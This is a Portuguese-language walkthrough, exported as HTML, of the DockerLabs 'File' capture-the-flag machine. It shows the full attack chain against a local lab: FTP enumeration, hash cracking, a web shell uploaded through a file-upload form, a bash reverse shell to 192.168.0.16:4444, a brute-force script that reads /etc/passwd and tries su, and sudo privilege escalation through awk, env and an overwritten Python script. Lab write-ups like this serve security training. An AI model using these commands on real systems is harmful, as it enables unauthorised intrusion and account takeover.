<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.file</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA FILE</span></strong></p><p></p><p><img src="images/204-1.png" alt="images/204-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/204-2.png" alt="images/204-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sC -sV -Pn -p- -T5 </span></strong></p><p></p><p><strong>Temos duas portas aberta:</strong></p><p></p><p><strong>porta 21: Anonymous, podemos ver que temos um arquivo </strong><strong><span style="color:#ff7800;">anon.txt</span></strong><strong> e nele pode ter algo interessante</strong></p><p><strong>porta 80: 80/tcp open  http    Apache httpd 2.4.41</strong></p><p></p><p><img src="images/204-3.png" alt="images/204-3.png" /></p><p></p><p><strong>Vamos entrar na porta 21:</strong></p><p></p><p><strong><span style="color:#ff7800;">ftp anonymous@172.17.0.2</span></strong></p><p></p><p><img src="images/204-4.png" alt="images/204-4.png" /></p><p></p><p><img src="images/204-5.png" alt="images/204-5.png" /></p><p></p><p><strong>hash: </strong><strong><span style="color:#ff7800;">53dd9c6005f3cdfc5a69c5c07388016d</span></strong></p><p></p><p><strong>Vamos criar um arquivo hash.txt e quebrar a senha com</strong><strong><span style="color:#ff7800;"> john</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">john --format=raw-md5 hash.txt</span></strong></p><p></p><p><strong>senha encontrada: </strong><strong><span style="color:#ff7800;">justin</span></strong></p><p></p><p><img src="images/204-6.png" alt="images/204-6.png" /></p><p></p><p><strong>Outra maneira de quebrar a hash é no site </strong><strong><a href="https://crackstation.net/">https://crackstation.net/</a></strong></p><p></p><p><img src="images/204-7.png" alt="images/204-7.png" /></p><p></p><p><strong>Agora vamos entra na porta 80: </strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><img src="images/204-8.png" alt="images/204-8.png" /></p><p></p><p><strong>Vamos analisar o código fonte, e observamos que tem um comentário interessante:</strong></p><p></p><p><img src="images/204-9.png" alt="images/204-9.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong>gobuster dir -u </strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong> -w /usr/share/seclists/Discovery/Web-Content/big.txt -x .txt,.html,.php,.py</strong></p><p></p><p><img src="images/204-10.png" alt="images/204-10.png" /></p><p></p><p><strong>Vamos entrar na pasta /file_upload.php: </strong><strong><a href="http://172.17.0.2/file_upload.php">http://172.17.0.2/file_upload.php</a></strong></p><p></p><p><strong>Veja que podemos tentar subir um arquivo com uma reverse shell</strong>.</p><p></p><p><img src="images/204-11.png" alt="images/204-11.png" /></p><p></p><p><img src="images/204-12.png" alt="images/204-12.png" /></p><p></p><p><strong>Esse script permite da comandos na url.</strong></p><p></p><p><img src="images/204-13.png" alt="images/204-13.png" /></p><p></p><p><strong>Vamos para o </strong><strong><span style="color:#ff7800;">burp suite </span></strong><strong>para </strong><strong><span style="color:#ff7800;">decoder</span></strong><strong> e depois </strong><strong><span style="color:#ff7800;">encoder</span></strong><strong> url, depois copiar o enconder e colar na url no navegador.</strong></p><p></p><p><strong><span style="color:#ff9d00;">bash</span></strong><strong> -c </strong><strong><span style="color:#3ad900;">&#39;bash -i &gt;&amp; /dev/tcp/192.168.0.16/4444 0&gt;&amp;1&#39;</span></strong></p><p></p><p><img src="images/204-14.png" alt="images/204-14.png" /></p><p></p><p><strong>Com isso temos a reverse shell: </strong><strong><a href="http://172.17.0.2/uploads/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.16%2f4444%200%3E%261%27">http://172.17.0.2/uploads/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.16%2f4444%200%3E%261%27</a></strong></p><p></p><p><img src="images/204-15.png" alt="images/204-15.png" /></p><p></p><p><img src="images/204-16.png" alt="images/204-16.png" /></p><p></p><p><strong>Vamos criar um script de força bruta na </strong><strong><span style="color:#ff7800;">máquina atacante</span></strong><strong> e depois transferir para </strong><strong><span style="color:#ff7800;">máquina da vitima</span></strong><strong>, para descobrir o usuário e a senha. </strong></p><p></p><p><strong><span style="color:#ff7800;">#!/bin/bash</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Definição de cores</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">VERMELHO=&#39;\033[1;31m&#39;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">VERDE=&#39;\033[1;32m&#39;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">AMARELO=&#39;\033[1;33m&#39;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">RESET=&#39;\033[0m&#39;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Parâmetros</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">LISTA_SENHAS=$1</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Verificação de argumentos</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">if [ $# -ne 1 ]; then</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  echo -e &quot;${VERDE}[${AMARELO}*${VERDE}] Uso: ${VERMELHO}$0 ${AMARELO}&lt;lista_senhas&gt;${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  exit 1</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">fi</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Função para limpeza e saída</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">sair() {</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  echo -e &quot;${VERMELHO}[-] Encerrando...${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  rm -f ./usuarios.txt</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  exit 1</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">}</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Função para checagem de erro</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">verificar_erro() {</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  if [ $? -ne 0 ]; then</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    echo -e &quot;${VERMELHO}[-] Ocorreu um erro, encerrando...${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    exit 1</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  fi</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">}</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Capturar usuários que possuem shells válidos e diretórios home</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">cat /etc/passwd | grep -E &quot;bash|dash|zsh|ksh|fish|home&quot; | sed &#39;s/:/ /g&#39; | awk &#39;{print $1}&#39; &gt; usuarios.txt</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">verificar_erro</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Configurar interrupção de execução</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">trap sair SIGINT</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Contar linhas da lista de senhas</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">LINHAS=$(wc -l $LISTA_SENHAS | awk &#39;{print $1}&#39;)</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">TENTATIVAS=0</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Início do loop de força bruta</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">while IFS= read -r SENHA; do</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  while IFS= read -r USUARIO; do</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    echo -e &quot;${VERDE}[${VERMELHO}*${VERDE}]${VERMELHO} Tentativa... $TENTATIVAS${AMARELO}/${VERMELHO}$LINHAS${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    if timeout 0.073 bash -c &quot;echo &#39;$SENHA&#39; | su $USUARIO&quot; &gt; /dev/null 2&gt;&amp;1; then</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">      clear</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">      echo -e &quot;${VERDE}[${VERMELHO}✓${VERDE}]${AMARELO} Senha ${VERMELHO}$SENHA${AMARELO} encontrada para o usuário ${VERMELHO}$USUARIO${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">      rm -f ./usuarios.txt</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">      exit 0</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    fi</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">    clear</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  done &lt; &quot;./usuarios.txt&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">  TENTATIVAS=$(($TENTATIVAS+1))</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">done &lt; &quot;$LISTA_SENHAS&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"># Mensagem final em caso de falha</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">clear</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">echo -e &quot;${VERMELHO}[-] Não foi possível encontrar a senha${RESET}&quot;</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">rm -f ./usuarios.txt</span></strong></p><p></p><p></p><p><img src="images/204-17.png" alt="images/204-17.png" /></p><p></p><p><strong>Máquina atacante</strong></p><p></p><p><img src="images/204-18.png" alt="images/204-18.png" /></p><p></p><p><strong>Máquina vítima</strong></p><p></p><p><img src="images/204-19.png" alt="images/204-19.png" /></p><p></p><p><strong>Ao executar a ferramenta, conseguimos:</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>usuário:  </strong><strong><span style="color:#ff7800;">fernando</span></strong><strong></strong></p><p><strong>senha: </strong><strong><span style="color:#ff7800;">chocolate</span></strong><strong></strong></p><p><strong></strong></p><p><img src="images/204-20.png" alt="images/204-20.png" /></p><p></p><p><img src="images/204-21.png" alt="images/204-21.png" /></p><p></p><p><strong>Conseguimos entrar no usuário fernando.</strong></p><p></p><p><img src="images/204-22.png" alt="images/204-22.png" /></p><p></p><p><strong>Vamos entrar na pasta de fernando, e ao entrar temos uma imagem, que vamos baixar na maquina atacante para ver se temos algo na imagem. </strong></p><p></p><p><img src="images/204-23.png" alt="images/204-23.png" /></p><p></p><p><strong>máquina atacante baixar a imagem:</strong></p><p></p><p><img src="images/204-24.png" alt="images/204-24.png" /></p><p></p><p><strong><span style="color:#ff7800;">stegseek --crack dragon-medieval.jpeg /usr/share/wordlists/rockyou.txt</span></strong></p><p></p><p><strong>Ao extrair a imagem com a ferramenta </strong><strong><span style="color:#ff7800;">stegseek</span></strong><strong>, vejamos que temos um hash.</strong></p><p></p><p><strong>hash:</strong><strong><span style="color:#ff7800;"> cbfdac6008f9cab4083784cbd1874f76618d2a97</span></strong></p><p></p><p><img src="images/204-25.png" alt="images/204-25.png" /></p><p></p><p><strong>Vamos ate o site:</strong><strong><a href="https://crackstation.net/">https://crackstation.net/</a></strong><strong>  para ver o que passa nessa hash.</strong></p><p></p><p><strong>senha: </strong><strong><span style="color:#ff7800;">password123</span></strong></p><p></p><p><img src="images/204-26.png" alt="images/204-26.png" /></p><p></p><p><strong>Com a senha que encontramos conseguimos entrar no usuário </strong><strong><span style="color:#ff7800;">mario</span></strong><strong>.</strong></p><p></p><p><img src="images/204-27.png" alt="images/204-27.png" /></p><p></p><p><strong>Vamos procurar por escalação de de privilégios </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> .</strong></p><p></p><p><strong>o usuário </strong><strong><code>mario</code></strong><strong> pode executar o comando </strong><strong><code>awk</code></strong><strong> como o usuário </strong><strong><code>julen</code></strong><strong> sem necessidade de senha. Isso pode ser explorado para obter privilégios do usuário </strong><strong><code>julen</code></strong><strong>.</strong></p><p></p><p><img src="images/204-28.png" alt="images/204-28.png" /></p><p></p><p><strong>Vamos entrar no site </strong><strong><a href="https://gtfobins.github.io/gtfobins/awk/">https://gtfobins.github.io/gtfobins/awk/</a></strong><strong> .</strong></p><p></p><p><img src="images/204-29.png" alt="images/204-29.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -u julen /usr/bin/awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</span></strong></p><p></p><p><strong>Somos o usuário julen.</strong></p><p></p><p><img src="images/204-30.png" alt="images/204-30.png" /></p><p></p><p><strong>Vamos procurar por escalação de de privilégios </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> .</strong></p><p></p><p><strong> o usuário </strong><strong><code>julen</code></strong><strong> pode executar o comando </strong><strong><code>env</code></strong><strong> como o usuário </strong><strong><code>iker</code></strong><strong> sem senha. Isso permite que você escale os privilégios para o usuário </strong><strong><code>iker</code></strong>.</p><p></p><p><img src="images/204-31.png" alt="images/204-31.png" /></p><p></p><p><strong>Vamos entrar novamente no site: </strong><strong><a href="https://gtfobins.github.io/gtfobins/env/">https://gtfobins.github.io/gtfobins/env/</a></strong></p><p></p><p><strong><span style="color:#ff7800;">sudo -u iker /usr/bin/env bash</span></strong></p><p></p><p><img src="images/204-32.png" alt="images/204-32.png" /></p><p></p><p><strong>Vamos procurar por escalação de de privilégios </strong><strong><span style="color:#ff7800;">sudo -l</span></strong><strong> .</strong></p><p></p><p><strong>O usuário </strong><strong><code>iker</code></strong><strong> pode executar o script Python </strong><strong><code>/home/iker/geo_ip.py</code></strong><strong> como qualquer usuário, incluindo o root, sem precisar de senha. Isso representa uma excelente oportunidade para escalar privilégios para root.</strong></p><p></p><p><img src="images/204-33.png" alt="images/204-33.png" /></p><p></p><p><img src="images/204-34.png" alt="images/204-34.png" /></p><p></p><p><strong>Vamos excluir esse arquivo e criar outro com o mesmo nome.</strong></p><p></p><p><strong><span style="color:#ff7800;">echo &#39;import os; os.system(&quot;/bin/bash&quot;)&#39; &gt; /home/iker/geo_ip.py</span></strong></p><p></p><p><img src="images/204-35.png" alt="images/204-35.png" /></p><p></p><p><strong>Agora é só da o comando que seremos </strong><strong><span style="color:#ff7800;">root</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">sudo /usr/bin/python3 /home/iker/geo_ip.py</span></strong></p><p></p><p><img src="images/204-36.png" alt="images/204-36.png" /></p><p></p><p><strong>somos root</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;">R10</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p> </p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
